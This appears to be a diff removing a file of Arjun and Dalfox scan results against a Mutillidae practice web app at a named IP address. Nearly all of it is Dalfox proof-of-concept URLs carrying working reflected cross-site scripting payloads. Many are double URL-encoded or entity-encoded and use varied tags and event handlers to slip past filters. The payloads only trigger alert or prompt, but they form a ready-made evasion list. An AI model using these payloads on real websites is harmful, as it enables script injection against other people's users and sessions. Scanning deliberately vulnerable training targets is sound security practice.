@@ -1,450 +1,0 @@
-[ARJUN] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&page=5740
-
-[ARJUN] https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl
-https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl&page=9363
-
-[DALFOX] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Csource+onload%3Dprompt%281%29+class%3Ddalfox%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fdo%3Dtoggle-bubble-hints%26page%3Dshow-log.php=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?go=%26gt%3B%26lt%3Bform%26gt%3B%26lt%3Bbutton+formaction%3Djavascript%3Aalert%281%29%26gt%3Btest%26lt%3B%2Fbutton%26gt%3B%26lt%3B%2Fform%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsource-viewer.php=%22%3E%3CIMG+SRC%3Dx+onratechange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&query=%3E%3Cembed+src%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fembed%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A7-Insufficient_Attack_Protection=%22%3E%3CIMG+SRC%3Dx+onmessage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2010-A8=%26%2339%3B%26gt%3B%26lt%3Bobject+data%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B%26lt%3B%2Fobject%26gt%3B&page=show-log.php[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cdiv+ontransitioncancel%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Fdiv%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A7-Missing_Function_Level_Access_Control=%26gt%3B%26lt%3Bembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%26gt%3B%26lt%3B%2Fembed%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?keyword=%22%3E%3CIMG+SRC%3Dx+ondragend%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dshow-log.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onsuspend%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&set-up-database.php=%2527%253E%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?jsonp=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onpagehide%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dview-user-privilege-level.php%26iv%3D6bc24fc1ab650b25b4114e93a98f1eba=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onpageshow%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_Ten=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?dir=%253E%253C%2565%256D%2562%2565%2564%2520%2573%2572%2563%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%2565%256D%2562%2565%2564%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?keywords=%26%2334%3B%26gt%3B%26lt%3Bimg+src%3Dx+onerror%3D%26%2334%3Bcrypto.subtle%26amp%3B%26amp%3Balert%281%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dclient-side-control-challenge.php=%2522%253E%253C%2564%2533%2522%253C%2522%252F%256F%256E%2563%256C%2569%2563%256B%253D%2522%253E%255B%2563%256F%256E%2566%2569%2572%256D%2560%2560%255D%2522%253C%2522%253E%257A&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?immagine=%2527%253E%253C%2573%2576%2567%253E%253C%2573%2565%2574%2520%256F%256E%2562%2565%2567%2569%256E%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2574%2574%2572%2569%2562%2575%2574%2565%254E%2561%256D%2565%253D%2578%2520%2574%256F%253D%2530%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A4-Broken_Access_Control=%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D56=%2527%253E%253C%256D%2561%2574%2568%253E%253C%256D%2569%252F%252F%2578%256C%2569%256E%256B%253A%2568%2572%2565%2566%253D%2564%2561%2574%2561%253A%2578%252C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?cat=%22%3E%3Csvg+onload%3D%22navigator.serviceWorker%26%26alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?categoryid=%26%2339%3B%26gt%3B%26lt%3BsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?csrf_token=%22%3E%3CIMG+SRC%3Dx+onplaying%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A1-Injection=%22%3E%3CIMG+SRC%3Dx+onstorage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-user-account.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%2561%2567%2565%2573%2568%256F%2577%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&window=%26gt%3B%26lt%3Btextarea+onfocus%3Dalert%281%29+autofocus%26gt%3B%26lt%3B%2Ftextarea%26gt%3B[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Ftwitter.com%2Fwebpwnized=%2527%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D11=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2562%2565%2566%256F%2572%2565%2570%2572%2569%256E%2574%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&view=%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dlogin.php=%3E%3Cselect+onfocus%3Dalert%281%29+autofocus%3E%3Coption%3Etest%3C%2Foption%3E%3C%2Fselect%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dframing.php=%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dregister.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onplaying%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?emailto=%26%2334%3B%26gt%3B%26lt%3BSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-lookup-dns-record.php=%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3Banimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.youtube.com%2Fuser%2Fwebpwnized=%26%2339%3B%26gt%3B%26lt%3Bobject+data%3D%23+codebase%3Djavascript%3Aalert%281%29%26gt%3B%26lt%3B%2Fobject%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A6-Sensitive_Data_Exposure=%2527%2522%253E%253C%2569%256D%2567%252F%2573%2572%2563%252F%256F%256E%2565%2572%2572%256F%2572%253D%252E%2531%257C%2561%256C%2565%2572%2574%2560%2560%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A5-Security_Misconfiguration=%253C%252F%2573%2563%2572%2569%2570%2574%253E%253C%2573%2576%2567%253E%253C%2573%2563%2572%2569%2570%2574%252F%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%252D%2525%2532%2536%2561%2570%256F%2573%253B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dphpmyadmin.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2573%2575%2573%2570%2565%256E%2564%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocumentation%2Fvulnerabilities.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256F%256E%256C%2569%256E%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&submit=%26%2339%3B%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3Buse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%26lt%3Bsvg+id%3D%26%2339%3Bx%26%2339%3B+xmlns%3D%26%2339%3Bhttp%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%26%2339%3B+onload%3D%26%2339%3Balert%281%29%26%2339%3B%26gt%3B%26lt%3B%2Fsvg%26gt%3B%23x%26gt%3B[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fdocumentation%2Fmutillidae-installation-on-xampp-win7.pdf=%2527%253E%253C%2566%256F%2572%256D%253E%253C%2562%2575%2574%2574%256F%256E%2520%2566%256F%2572%256D%2561%2563%2574%2569%256F%256E%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E%253C%252F%2566%256F%2572%256D%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A10-Underprotected_APIs=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2564%256F%2563%2575%256D%2565%256E%2574%252E%2564%256F%256D%2561%2569%256E%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dstyling-frame.php%26page-to-frame%3Dstyling.php%253Fpage-title%253DStyling%2Bwith%2BMutillidae=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2564%2572%2561%2567%256C%2565%2561%2576%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocument-viewer.php%26PathToDocument%3Ddocumentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php=%2522%253E%253C%2553%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%256C%2561%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A3-Cross-Site_Scripting_%2528XSS%2529=%26gt%3B%26lt%3Bbase+href%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dview-someones-blog.php=%22%3E%3Cimg+src%3Dx+onerror%3D%22self.alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Duser-info-xpath.php=%253E%253C%2562%2575%2574%2574%256F%256E%2520%256F%256E%2566%256F%2563%2575%2573%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2575%2574%256F%2566%256F%2563%2575%2573%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dhtml5-storage.php=%2522%253E%253C%2569%2546%2572%2541%256D%2565%252F%2573%2572%2563%253D%256A%2561%2556%2561%2573%2563%2552%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%2569%2546%2572%2561%256D%2545%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?callback=%22%3E%3CIMG+SRC%3Dx+oncuechange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file_name=%26%2339%3B%26gt%3B%26lt%3Ba+href%3Djavas%26amp%3B%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%26gt%3Bclick&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fdo%3Dtoggle-enforce-ssl%26page%3Dshow-log.php=%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dtext-file-viewer.php=%3E%3Cobject+data%3Djavascript%3Aalert%281%29%3E%3C%2Fobject%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsecret-administrative-pages.php=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2574%256F%2570%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file_url=%26%2334%3B%26gt%3B%26lt%3Bd3%26%2334%3B%26lt%3B%26%2334%3B%2Fonclick%3D%26%2334%3B+class%3Ddalfox%26gt%3B%5Bconfirm%60%60%5D%26%2334%3B%26lt%3B%26%2334%3B%26gt%3Bz&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dcaptured-data.php=%26gt%3B%26lt%3Bsvg%2Fonload%3Dalert%281%29%2F%2F%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?goto=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2573%2565%2561%2572%2563%2568%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Drobots-txt.php=%2527%253E%253C%2573%2576%2567%252F%2563%256C%2561%2573%2573%253D%2527%2564%2561%256C%2566%256F%2578%2527%256F%256E%254C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file=%253E%253C%2573%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dphpinfo.php=%26gt%3B%26lt%3Bselect+onfocus%3Dalert%281%29+autofocus%26gt%3B%26lt%3Boption%26gt%3Btest%26lt%3B%2Foption%26gt%3B%26lt%3B%2Fselect%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dadd-to-your-blog.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D12=%27%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E&page=show-log.php[0m
-[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Csource+onload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?html=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+ondurationchange%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dsource-viewer.php=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocumentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%2561%2567%2565%2573%2568%256F%2577%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fincludes%2Fpop-up-help-context-generator.php%3Fpagename%3Dshow-log.php=%26gt%3B%26lt%3Bmath%26gt%3B%26lt%3Bmi%2F%2Fxlink%3Ahref%3Ddata%3Ax%2C%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?enddate=%2527%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsite-footer-xss-discussion.php=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dssl-misconfiguration.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%256C%2561%2579%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?img_url=%26%2339%3B%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3BanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%26gt%3B&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D55=%22%3E%3CIMG+SRC%3Dx+oncontextmenu%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dset-background-color.php=%22%3E%3CIMG+SRC%3Dx+onended%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?cmd=%253E%253C%2564%2565%2574%2561%2569%256C%2573%2520%256F%2570%2565%256E%2520%256F%256E%2574%256F%2567%2567%256C%2565%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%2564%2565%2574%2561%2569%256C%2573%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?month=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2566%2572%2561%256D%2565%2573%255B%2530%255D%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
-[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?item=%22%3E%3CIMG+SRC%3Dx+onplay%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
